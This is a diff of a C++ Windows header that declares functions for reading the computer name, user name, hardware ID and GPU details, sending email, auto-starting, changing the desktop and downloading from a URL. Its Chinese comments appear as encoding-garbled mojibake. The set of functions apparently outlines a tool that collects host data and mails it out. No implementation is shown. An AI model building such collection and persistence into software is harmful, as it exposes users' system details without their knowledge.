@@ -1,20 +1,21 @@
 #pragma once
-
+#include "log.h"
 #include <direct.h>
 #include <iostream>
 #include <windows.h>
 #include <io.h>
 #include <winbase.h>
-#include "stdlib.h" //»ñÈ¡Èí¼şÂ·¾¶Í·ÎÄ¼ş
+#include "stdlib.h" //è·å–è½¯ä»¶è·¯å¾„å¤´æ–‡ä»¶
 #include <string>
 #include <ostream>
 #include <fstream>
 #include <tchar.h>
+
 #pragma comment(lib , "DXGI.lib")
-//ÏÂÔØÄ£¿é¶¨Òå
+//ä¸‹è½½æ¨¡å—å®šä¹‰
 #pragma comment(lib,"urlmon.lib")
 #pragma comment(lib,"ws2_32.lib")
-//GPU¿â
+//GPUåº“
 #include <DXGI.h>  
 #include <vector>  
 //
@@ -35,20 +36,22 @@ wstring windows_computer_name();
 //void windows_email_tage();
 //void windows_email_main();
 void Windows_email_tou_name();
-void fstream_fish();//´´½¨ÎÄ±¾ÎÄµµ
-void fstream_double(char username); //ÏòÎÄ±¾ÎÄµµĞ´ÈëÊı¾İ
+void fstream_fish();//åˆ›å»ºæ–‡æœ¬æ–‡æ¡£
+void fstream_double(char username); //å‘æ–‡æœ¬æ–‡æ¡£å†™å…¥æ•°æ®
 string wstring2string(wstring wstr);
-string windows_user_name_noreturn(); //windowsÓÃ»§Ãû³Æ£¬ÎŞÆäËû·µ»ØÀàĞÍ
-void system_information_table();         //¸ü¸ÄÏµÍ³×ÀÃæ(´Ëº¯ÊıÔİÊ±Î´µÃµ½²âÊÔ)
-string text_box_auto();    //ÓÊ¼şÕıÎÄ
+string windows_user_name_noreturn(); //windowsç”¨æˆ·åç§°ï¼Œæ— å…¶ä»–è¿”å›ç±»å‹
+void system_information_table();         //æ›´æ”¹ç³»ç»Ÿæ¡Œé¢(æ­¤å‡½æ•°æš‚æ—¶æœªå¾—åˆ°æµ‹è¯•)
+string text_box_auto();    //é‚®ä»¶æ­£æ–‡
 void AutoStart();//AOTU START
-void exe_path(); //Èí¼şÂ·¾¶
-void email(); //ÓÊ¼şÄ£¿é
+void exe_path(); //è½¯ä»¶è·¯å¾„
+void email(); //é‚®ä»¶æ¨¡å—
 void ifsteam_open_read();
 void c_box_information();
 string system_information();
 string system_information_text();
-string GetHWID();//HWIDÄ£¿é
-int GPU_information();//GPUĞÅÏ¢Ä£¿é
+string GetHWID();//HWIDæ¨¡å—
+int GPU_information();//GPUä¿¡æ¯æ¨¡å—
 std::string WStringToString(const std::wstring& wstr);
-void download(string usl);//ÏÂÔØÄ£¿é
+void download(string usl);//ä¸‹è½½æ¨¡å—
+int log();//æ—¥å¿—æ¨¡å—
+void file_decompression(string file_decompression_name);//è§£å‹æµ‹è¯•æ¨¡å—
